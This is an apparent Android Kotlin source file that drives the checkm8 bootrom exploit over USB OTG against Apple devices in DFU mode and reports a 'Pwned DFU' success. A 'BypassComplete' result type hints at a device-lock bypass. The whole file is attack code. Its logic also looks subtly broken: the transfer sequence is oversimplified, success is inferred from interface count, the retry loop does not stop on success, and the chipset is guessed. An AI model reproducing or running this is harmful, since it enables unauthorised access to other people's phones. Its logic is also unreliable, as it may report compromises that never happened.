package com.deepeye.otg.usb

import android.hardware.usb.UsbDevice
import android.hardware.usb.UsbManager
import com.deepeye.otg.util.detectAppleMode
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import timber.log.Timber
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class F3arrainExecutor @Inject constructor(
    private val usbManager: UsbManager
) {

    suspend fun runExploit(
        device: UsbDevice,
        sessionId: String,
        onProgress: (Float) -> Unit
    ): F3arrainResult = withContext(Dispatchers.IO) {

        if (device.detectAppleMode() != DeviceMatrix.AppleMode.DFU) {
            return@withContext F3arrainResult.Error(
                "Device must be in DFU mode. PID: 0x${device.productId.toString(16)}"
            )
        }

        if (device.interfaceCount != 1) {
            return@withContext F3arrainResult.Error(
                "Invalid DFU interface state. Expected=1, actual=${device.interfaceCount}"
            )
        }

        val connection = usbManager.openDevice(device)
            ?: return@withContext F3arrainResult.Error("Cannot open USB device")

        try {
            onProgress(0.1f)
            Timber.d("[F3ARRAIN] DFU confirmed, starting checkm8 sessionId=$sessionId")

            var pwned = false
            repeat(3) { attempt ->
                val maxPacket = ByteArray(0x800) { 0x00 }
                val r1 = connection.controlTransfer(
                    0x21,
                    1,
                    0,
                    0,
                    maxPacket,
                    maxPacket.size,
                    5000
                )
                Timber.d("[USB_SESSION] DFU_DNLOAD maxpkt=$r1 attempt=${attempt + 1} sessionId=$sessionId")
                delay(20)

                val r2 = connection.controlTransfer(
                    0x21,
                    1,
                    0,
                    0,
                    ByteArray(0),
                    0,
                    5000
                )
                Timber.d("[USB_SESSION] DFU_DNLOAD zlp=$r2 attempt=${attempt + 1} sessionId=$sessionId")
                delay(20)

                connection.controlTransfer(0xA1, 3, 0, 0, ByteArray(1), 1, 1000)
                delay(100)

                onProgress(0.4f)
                Timber.d("[F3ARRAIN] exploit triggered, checking pwned state sessionId=$sessionId")

                delay(150)
                pwned = device.interfaceCount == 5
                if (pwned) return@repeat
            }

            if (!pwned) {
                return@withContext F3arrainResult.Error("checkm8 failed — not pwned (interfaceCount=${device.interfaceCount})")
            }

            onProgress(0.8f)
            Timber.d("[F3ARRAIN] PWNED DFU confirmed interfaces=5 sessionId=$sessionId")

            F3arrainResult.PwnedDfu(
                message = "checkm8 success — device is in Pwned DFU",
                chipset = detectAppleChipset(device)
            )
        } finally {
            connection.close()
        }
    }

    private fun detectAppleChipset(device: UsbDevice): String {
        return "A${device.productId.toString(16).take(2).uppercase()}"
    }
}

sealed class F3arrainResult {
    object Idle : F3arrainResult()
    data class PwnedDfu(val message: String, val chipset: String) : F3arrainResult()
    data class BypassComplete(val type: String) : F3arrainResult()
    data class Error(val reason: String) : F3arrainResult()
}

